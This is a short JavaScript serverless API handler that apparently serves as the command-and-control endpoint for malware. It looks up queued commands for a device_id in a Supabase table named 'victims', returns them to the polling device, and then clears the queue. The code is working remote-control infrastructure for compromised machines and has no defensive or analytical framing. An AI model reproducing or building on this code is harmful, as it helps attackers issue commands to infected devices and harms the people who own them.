
import { supabase } from './_lib/supabase.js';

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'GET') return res.status(405).json({ error: 'Method not allowed' });
    
    const { device_id } = req.query;
    
    const { data, error } = await supabase
        .from('victims')
        .select('commands')
        .eq('device_id', device_id)
        .single();
    
    if (error) return res.status(500).json({ error: error.message });
    
    const commands = data?.commands || [];
    
    await supabase
        .from('victims')
        .update({ commands: [] })
        .eq('device_id', device_id);
    
    res.json({ commands });
}
